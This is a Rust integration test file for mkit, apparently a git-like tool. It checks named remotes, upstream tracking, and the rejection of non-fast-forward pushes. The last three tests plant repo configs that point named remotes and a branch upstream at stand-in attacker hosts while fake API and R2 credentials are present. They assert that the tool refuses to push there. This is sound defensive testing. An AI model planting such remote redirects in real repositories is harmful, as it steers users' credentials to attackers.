//! Named-remote + upstream-tracking + CAS-safe push tests (#175).
//!
//! Driven end-to-end through the real binary against a `mkit+file://`
//! bare-directory remote (the file transport is URL-reachable and
//! honours CAS `update_ref`, so non-fast-forward rejection is exercised
//! for real).
#![allow(clippy::unwrap_used)] // unwrap is the assertion in test helpers

use std::fs;
use std::path::Path;
use std::process::{Command, Output};

fn mkit_bin() -> &'static str {
    env!("CARGO_BIN_EXE_mkit")
}

fn run_in(cwd: &Path, args: &[&str]) -> Output {
    let xdg = tempfile::tempdir().expect("xdg tempdir");
    let out = Command::new(mkit_bin())
        .args(args)
        .current_dir(cwd)
        .env("XDG_CONFIG_HOME", xdg.path())
        .output()
        .expect("spawn mkit");
    drop(xdg);
    out
}

/// Init a repo with a key and one commit; returns the temp dir.
fn repo_with_commit(content: &[u8]) -> tempfile::TempDir {
    let td = tempfile::tempdir().unwrap();
    assert!(run_in(td.path(), &["init"]).status.success());
    assert!(run_in(td.path(), &["keygen"]).status.success());
    fs::write(td.path().join("a.txt"), content).unwrap();
    assert!(run_in(td.path(), &["add", "a.txt"]).status.success());
    assert!(run_in(td.path(), &["commit", "-m", "c1"]).status.success());
    td
}

fn file_url(dir: &Path) -> String {
    format!("mkit+file://{}", dir.display())
}

fn local_main(repo: &Path) -> String {
    fs::read_to_string(repo.join(".mkit/refs/heads/main"))
        .unwrap()
        .trim()
        .to_string()
}

fn remote_main(remote_dir: &Path) -> Option<String> {
    fs::read_to_string(remote_dir.join("refs/heads/main"))
        .ok()
        .map(|s| s.trim().to_string())
}

#[test]
fn named_remote_add_lists_in_default_and_json() {
    let td = repo_with_commit(b"hi");
    let remote = tempfile::tempdir().unwrap();
    let url = file_url(remote.path());
    let add = run_in(td.path(), &["remote", "add", "origin", &url]);
    assert!(add.status.success(), "remote add origin failed: {add:?}");

    // Bare `remote` lists NAMES only (git-shaped); the URL is under `-v`.
    let out = run_in(td.path(), &["remote"]);
    assert!(out.status.success());
    let names = String::from_utf8(out.stdout).unwrap();
    assert!(names.contains("origin"), "default listing: {names}");

    let out = run_in(td.path(), &["remote", "-v"]);
    assert!(out.status.success());
    let stdout = String::from_utf8(out.stdout).unwrap();
    assert!(stdout.contains("origin"), "verbose listing: {stdout}");
    assert!(stdout.contains(&url));

    let out = run_in(td.path(), &["remote", "--format=json"]);
    let stdout = String::from_utf8(out.stdout).unwrap();
    assert!(
        stdout.contains("\"name\":\"origin\""),
        "json listing should carry name=origin: {stdout}"
    );
    assert!(stdout.contains("\"transport\":\"file\""));
}

#[test]
fn default_push_records_upstream_and_pushes_current_branch() {
    let td = repo_with_commit(b"hi");
    let remote = tempfile::tempdir().unwrap();
    let url = file_url(remote.path());
    assert!(
        run_in(td.path(), &["remote", "add", "origin", &url])
            .status
            .success()
    );

    // First push must name the remote (no upstream yet).
    let out = run_in(td.path(), &["push", "origin"]);
    assert!(out.status.success(), "push origin failed: {out:?}");
    assert_eq!(
        remote_main(remote.path()).as_deref(),
        Some(local_main(td.path()).as_str())
    );

    // Upstream is now recorded → bare `mkit push` works.
    fs::write(td.path().join("a.txt"), b"hi2").unwrap();
    assert!(run_in(td.path(), &["add", "a.txt"]).status.success());
    assert!(run_in(td.path(), &["commit", "-m", "c2"]).status.success());
    let out = run_in(td.path(), &["push"]);
    assert!(out.status.success(), "bare push failed: {out:?}");
    assert_eq!(
        remote_main(remote.path()).as_deref(),
        Some(local_main(td.path()).as_str())
    );
}

#[test]
fn push_with_no_upstream_and_no_default_refuses_actionably() {
    let td = repo_with_commit(b"hi");
    let out = run_in(td.path(), &["push"]);
    assert!(!out.status.success(), "push with no remote must fail");
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("no upstream") || stderr.contains("no remote"),
        "expected actionable no-upstream message: {stderr}"
    );
}

#[test]
fn non_fast_forward_push_is_rejected_without_force() {
    let td = repo_with_commit(b"hi");
    let remote = tempfile::tempdir().unwrap();
    let url = file_url(remote.path());
    assert!(
        run_in(td.path(), &["remote", "add", "origin", &url])
            .status
            .success()
    );
    assert!(run_in(td.path(), &["push", "origin"]).status.success());

    // Simulate the remote moving forward independently: rewrite the
    // remote ref to a different (bogus-but-valid) hash so our cached
    // tracking ref no longer matches.
    let other = "0".repeat(64);
    fs::write(remote.path().join("refs/heads/main"), format!("{other}\n")).unwrap();

    // New local commit; default push should be rejected (CAS Match
    // against our last-seen tracking tip, which the remote no longer
    // holds).
    fs::write(td.path().join("a.txt"), b"hi2").unwrap();
    assert!(run_in(td.path(), &["add", "a.txt"]).status.success());
    assert!(run_in(td.path(), &["commit", "-m", "c2"]).status.success());
    let out = run_in(td.path(), &["push"]);
    assert!(
        !out.status.success(),
        "non-ff push must be rejected: {out:?}"
    );
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("non-fast-forward"),
        "expected non-fast-forward error: {stderr}"
    );

    // --force overrides.
    let out = run_in(td.path(), &["push", "--force"]);
    assert!(out.status.success(), "force push should succeed: {out:?}");
    assert_eq!(
        remote_main(remote.path()).as_deref(),
        Some(local_main(td.path()).as_str())
    );
}

/// True-fast-forward enforcement: a *divergent* local tip whose history
/// does NOT descend from the last-seen remote-tracking ref must be
/// rejected by default `push` even though the CAS `Match` lease still
/// holds (the remote hasn't moved). This is the gap a bare `Match`
/// lease leaves open — Git rejects it as non-fast-forward, and so do we.
/// `--force-with-lease` intentionally still permits it (lease holds).
#[test]
fn default_push_rejects_divergent_tip_even_when_lease_holds() {
    let td = repo_with_commit(b"hi"); // c1 (root)
    let remote = tempfile::tempdir().unwrap();
    let url = file_url(remote.path());
    assert!(
        run_in(td.path(), &["remote", "add", "origin", &url])
            .status
            .success()
    );
    let c1 = local_main(td.path());
    assert!(run_in(td.path(), &["push", "origin"]).status.success());

    // c2 on top of c1; push it so remote == tracking == c2.
    fs::write(td.path().join("a.txt"), b"hi2").unwrap();
    assert!(run_in(td.path(), &["add", "a.txt"]).status.success());
    assert!(run_in(td.path(), &["commit", "-m", "c2"]).status.success());
    assert!(run_in(td.path(), &["push"]).status.success());
    let c2 = remote_main(remote.path()).unwrap();
    assert_ne!(c1, c2);

    // Reset the local branch back to c1 and commit c1' — a sibling of c2
    // (parent = c1), so c1' is NOT a descendant of c2. The remote-tracking
    // ref still says c2 and the remote still holds c2, so a bare CAS
    // Match(c2) would PASS — only the ancestry check stops the clobber.
    fs::write(td.path().join(".mkit/refs/heads/main"), format!("{c1}\n")).unwrap();
    fs::write(td.path().join("a.txt"), b"hi3").unwrap();
    assert!(run_in(td.path(), &["add", "a.txt"]).status.success());
    assert!(
        run_in(td.path(), &["commit", "-m", "c1prime"])
            .status
            .success()
    );
    let c1prime = local_main(td.path());
    assert_ne!(c1prime, c2);

    let out = run_in(td.path(), &["push"]);
    assert!(
        !out.status.success(),
        "divergent (non-descendant) tip must be rejected by default push: {out:?}"
    );
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("non-fast-forward"),
        "expected non-fast-forward error for divergent tip: {stderr}"
    );
    // Remote untouched.
    assert_eq!(remote_main(remote.path()).as_deref(), Some(c2.as_str()));

    // --force-with-lease intentionally permits it: the lease (remote ==
    // last-seen tracking ref c2) still holds, so the overwrite proceeds.
    let out = run_in(td.path(), &["push", "--force-with-lease"]);
    assert!(
        out.status.success(),
        "--force-with-lease should still permit a divergent tip when the lease holds: {out:?}"
    );
    assert_eq!(
        remote_main(remote.path()).as_deref(),
        Some(c1prime.as_str())
    );
}

#[test]
fn dry_run_contacts_nothing() {
    let td = repo_with_commit(b"hi");
    let remote = tempfile::tempdir().unwrap();
    let url = file_url(remote.path());
    assert!(
        run_in(td.path(), &["remote", "add", "origin", &url])
            .status
            .success()
    );
    let out = run_in(td.path(), &["push", "origin", "--dry-run"]);
    assert!(out.status.success(), "dry-run failed: {out:?}");
    // Nothing written to the remote.
    assert_eq!(remote_main(remote.path()), None);
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("dry-run"),
        "expected dry-run note: {stderr}"
    );
}

#[test]
fn push_all_mirrors_every_branch() {
    let td = repo_with_commit(b"hi");
    let remote = tempfile::tempdir().unwrap();
    let url = file_url(remote.path());
    assert!(
        run_in(td.path(), &["remote", "add", "origin", &url])
            .status
            .success()
    );
    assert!(run_in(td.path(), &["branch", "feature"]).status.success());

    let out = run_in(td.path(), &["push", "origin", "--all"]);
    assert!(out.status.success(), "push --all failed: {out:?}");
    assert!(remote.path().join("refs/heads/main").exists());
    assert!(remote.path().join("refs/heads/feature").exists());
}

/// #175 must not weaken #97: a hostile *named* repo remote with ambient
/// credentials is still refused per ENDPOINT.
#[test]
fn named_repo_remote_with_token_is_still_gated() {
    let td = repo_with_commit(b"hi");
    // Plant a repo-scoped named remote pointing at an HTTP endpoint.
    let cfg = "remote.evil.url = mkit+https://attacker.invalid/repo\n\
               remote.evil.type = http\n";
    fs::write(td.path().join(".mkit/config"), cfg).unwrap();

    let xdg = tempfile::tempdir().unwrap();
    let out = Command::new(mkit_bin())
        .args(["push", "evil"])
        .current_dir(td.path())
        .env("XDG_CONFIG_HOME", xdg.path())
        .env("MKIT_API_TOKEN", "secret")
        .output()
        .expect("spawn mkit");
    drop(xdg);
    assert!(
        !out.status.success(),
        "hostile named remote must be refused"
    );
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("refusing repo-configured remote"),
        "expected credential refusal for named repo remote: {stderr}"
    );
}

/// Most faithful confused-deputy shape: a hostile clone plants BOTH a
/// malicious named remote AND a per-branch upstream pointing at it, so a
/// victim running a *bare* `mkit push` (no explicit remote argument)
/// would otherwise be steered at the attacker endpoint with ambient
/// credentials. The per-endpoint gate must still fire — trust is keyed
/// on the resolved endpoint, never the (repo-supplied) upstream name.
#[test]
fn bare_push_to_repo_planted_upstream_is_still_gated() {
    let td = repo_with_commit(b"hi");
    // Repo-scoped config: named HTTP remote + branch upstream redirect.
    let cfg = "remote.evil.url = mkit+https://attacker.invalid/repo\n\
               remote.evil.type = http\n\
               branch.main.remote = evil\n\
               branch.main.merge = main\n";
    fs::write(td.path().join(".mkit/config"), cfg).unwrap();

    let xdg = tempfile::tempdir().unwrap();
    let out = Command::new(mkit_bin())
        .args(["push"]) // bare push -> resolves the repo-planted upstream
        .current_dir(td.path())
        .env("XDG_CONFIG_HOME", xdg.path())
        .env("MKIT_API_TOKEN", "secret")
        .output()
        .expect("spawn mkit");
    drop(xdg);
    assert!(
        !out.status.success(),
        "bare push to repo-planted upstream must be refused"
    );
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("refusing repo-configured remote"),
        "expected credential refusal for repo-planted upstream: {stderr}"
    );
}

/// S3 sibling of the named-remote gate: a hostile repo-scoped named S3
/// remote with ambient R2 credentials present must also be refused.
#[test]
fn named_repo_s3_remote_with_creds_is_still_gated() {
    let td = repo_with_commit(b"hi");
    let cfg = "remote.evil.url = mkit+s3://r2.attacker.invalid/bucket/proj\n\
               remote.evil.type = s3\n";
    fs::write(td.path().join(".mkit/config"), cfg).unwrap();

    let xdg = tempfile::tempdir().unwrap();
    let out = Command::new(mkit_bin())
        .args(["push", "evil"])
        .current_dir(td.path())
        .env("XDG_CONFIG_HOME", xdg.path())
        .env("MKIT_R2_ACCESS_KEY_ID", "test-key")
        .env("MKIT_R2_SECRET_ACCESS_KEY", "test-secret")
        .output()
        .expect("spawn mkit");
    drop(xdg);
    assert!(
        !out.status.success(),
        "hostile named S3 remote must be refused"
    );
    let stderr = String::from_utf8(out.stderr).unwrap();
    assert!(
        stderr.contains("refusing repo-configured remote"),
        "expected credential refusal for named S3 repo remote: {stderr}"
    );
}
